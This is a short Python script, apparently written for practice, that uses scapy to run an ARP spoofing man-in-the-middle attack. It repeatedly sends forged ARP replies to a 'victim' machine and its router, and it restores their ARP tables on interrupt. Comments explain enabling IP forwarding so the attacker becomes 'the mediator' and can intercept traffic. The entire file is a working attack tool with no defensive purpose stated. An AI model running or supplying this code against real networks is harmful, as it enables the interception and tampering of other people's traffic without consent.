#!/usr/bin/env/ python
#op and pdst is for th ip and mac address of the victim respectively and prsc is for the ip of router.
#All this info like hwdst and pdst are coming from importing scapy in kernel and thn doing scapy.ls(scapy.ARP)
# THen if you want the ip of the router manually then you can use route -n to get it.
# (,)   also for same.if you want to run it in 2.7 then remove end function in line 31
# sys.stdout.flush() this is also for python 2.7 not for above before time function
# echo 1 > /proc/sys/net/ipv4/ip_forward it is used to forward the packets and become the mediator
# import sys this method only works for python 2.7 or below for python 2.7
# if you want to run the code in python 3 then you just need to add end="" in the line 35

import scapy.all as scapy
import time
import sys

def get_mac(ip_address):
    arp_request=scapy.ARP(pdst=ip_address)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #set the destination mac to broadcast mac
    arp_request_brodcast=broadcast/arp_request
    answered_list = scapy.srp(arp_request_brodcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc



def spoof(target_ip, spoof_ip):
    target_mac=get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

sent_packets_count = 0

def restore(destination_ip, source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet=scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip="192.168.17.141"
gateway_ip="192.168.17.2"

try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r Packets sent = "+str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt :
    print(" [+] Detected CTRL + C....Resetting the ARP back to normal....Please wait")
    restore(target_ip,gateway_ip)
    restore(gateway_ip,target_ip)


